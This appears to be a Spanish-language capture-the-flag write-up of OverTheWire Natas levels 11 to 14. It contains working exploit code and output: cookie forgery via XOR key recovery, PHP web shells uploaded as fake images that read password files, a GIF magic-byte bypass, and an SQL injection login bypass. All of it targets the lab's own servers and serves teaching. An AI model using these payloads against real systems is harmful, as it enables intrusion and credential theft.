
## Natas11

Este ejercicio es mas complejo de lo habitual, basicamente te presenta un planel donde puedes cambiar el color de fondo de la página (con su representacion 
hexadecimal) y  un "index-source.html" en el que se muestra como toma los datos de ese color de antes y crea una cookie con ellos.
Lo he comprimido todo para que resulte mas legible.
```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");  //Diccionario por defecto ->  valor showpassword (no) y el color (blanco)

function xor_encrypt($in) { 
    $key = '<censored>';   $text = $in;   $outText = ''; // Un texto de entrada, una llave para encriptar y uno de salida tras la encriptacion.
    for($i=0;$i<strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } // El algoritmo, no le vamos a prestar mucha atención
    return $outText;}   // El texto de salida ya encriptado.

function loadData($def) {
    global $_COOKIE;  
    $mydata = $def;   // Esto es la varaible $defaultdata de arriba solo que le han abreviado el nombre para liar.
    if(array_key_exists("data", $_COOKIE)) {   // Se comprueba que exista una cookie "data=algo"
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);  // La cookie que obtengamos se desencripta en "tempdata"
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) { 
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor']; }}}
    return $mydata;}  // $tempdata es un diccioanrio como el defaultdata (color y show password), $mydata cogera sus valores de $tempdata (replica pues)

function saveData($d) { setcookie("data", base64_encode(xor_encrypt(json_encode($d))));}  // Para crear la cookie data de $defaultdata supongo.

$data = loadData($defaultdata); // Esto es lo primero que hace el script, crear una cookie con el $defaultdata

if(array_key_exists("bgcolor",$_REQUEST)) {  // Esto simplemente es para comprobar que el color es valido y ponerlo de fondo
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) { $data['bgcolor'] = $_REQUEST['bgcolor']; }}
        
saveData($data);
```
Si hacemos una peticion curl al sistema se nos da una cookie. Cuyo nombre es "data" como decia el script.
```console
[cucuxii@parrot]~[natas]$: curl -s "http://natas11.natas.labs.overthewire.org" -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK -I                           
Set-Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D   # El %3D es "=" en urlencode
```
En el script de antes decimos que tenemos el diccionario con el color y si nos va a mostrar la contraseña o no, un algoritmo que lo encripta y
otro que lo desencripta de igual manera.

```php
php > print(base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw="));
UK"H+O%▒pSWh]UZ-▒T%UhR^,^h   // bytes sin sentido, asi que habra que hacerlo todo de una
```
Vamos a crear un script que use la funcion xor_encript de antes, el base64 decode, el urldecode y el json encode para crear una cookie buena
```$data= array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");}"```

Tuve que investigar bastante, resulta que si tenemos un "xor", un texto encriptado y el mismo desencriptado ya podemos calcular la llave con eso, 
luego con la llave pues crear nuestro texto. 
El texto es la cookie que nos dan, y su version encriptada es el diccionario "defaultdata", de esos dos sacaremos la clave.
```php
<?php
$key = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
$text = json_encode($defaultdata);
$outText = '';

for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];}
print($outText);
?>
```
```console
[cucuxii@parrot]~[natas]$: php xor.php                                                                                                                     
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```
Ya tenemos la clave, ahora a crear con ella el diccionario bueno.
```php
<?php
$key = 'qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq';
$defaultdata = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
$text = json_encode($defaultdata);
$outText = '';

for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];}
print(base64_encode($outText));
?>
```
```console
[cucuxii@parrot]~[natas]$: php xor2.php 
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
[cucuxii@parrot]~[natas]$: curl -s "http://natas11.natas.labs.overthewire.org" -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK \
> --cookie "data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>
```
## Natas12

Aquí hay un panel dónde podemos subir una foto, nos dicen que tiene que pesar máximo 1KB. Una vez subido te da un enlace para visualizarlo.
La cosa es crear un php ```<?php system("cat /etc/natas_webpass/natas13"); ?>``` con el nombre "natas.jpg"

Hay dos maneras de hacer esto
1. Subir el archivo pero interceptar con el burpsuite, cambiando el "filename: " de "natas.jpg" a "natas.php"
2. Hacer un script de python

```python
import requests
import re

url = 'http://natas12.natas.labs.overthewire.org/index.php'
name = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'
php = open('natas.jpg', 'rb')
# Subimos el archivo
req = requests.post(url, auth=(name, password), data = {"filename":"natas.php", "MAX_FILE_SIZE":"1000"}, files = {"uploadedfile": php})
# Pillamos el link que nos da
url2 = url.replace("index.php", re.findall(r'<a href="(.*?)">',req.text)[0])
req2 = requests.get(url2, auth=(name, password))
print(req2.text) # Imprimir el resultado del php interpretado
```
## Natas13

Igual que antes, pero ahora valida que lo que subamos sea una foto, asi que el "natas.jpg" es algo diferente. ¿Como sabe el sistema que es una foto a parte de por la extension? Porque lee los primeros bits. Dichos bits en cualquier archivo son la cabecera, los cuales dicen que clase de archivo es.
Para imagenes se suele usar "GIF8"
```
GIF8;
<?php system("cat /etc/natas_webpass/natas14"); ?>
```
```python
import requests
import re

url = 'http://natas13.natas.labs.overthewire.org/index.php'
name = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'
php = open('natas.jpg', 'rb')

req = requests.post(url, auth=(name, password), data = {"filename":"natas.php", "MAX_FILE_SIZE":"1000"}, files = {"uploadedfile": php})
url2 = url.replace("index.php", re.findall(r'<a href="(.*?)">',req.text)[0])
req2 = requests.get(url2, auth=(name, password))
print(req2.text)
```
## Natas 14

Aquí nos encontramos un formulario por post "username y password" y un "index-source.html" que nos muestra que tanto el nombre como la contraseña se
meteran en una base de datos SQL.
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```
El problema es que no hay sanitizacion asi que se puede la trampa. Si pones *" or 1=1-- -* dices que o la contraseña es un texto vacio (falso) o 1=1 (verdadero). Aqui la puerta OR dice que la sentencia es valida con que una sola cosa sea verdadera, y como *1=1*, pues adelante.

```python
import requests
import re

url = 'http://natas14.natas.labs.overthewire.org'
name = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'
nombre = '" or 1=1-- -'
req = requests.post(url, auth=(name, password), data = {"username":nombre, "password":"test"})
print(req.text)
```
```console
[cucuxii@parrot]~[natas]$: python3 natas14.py
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br>
```




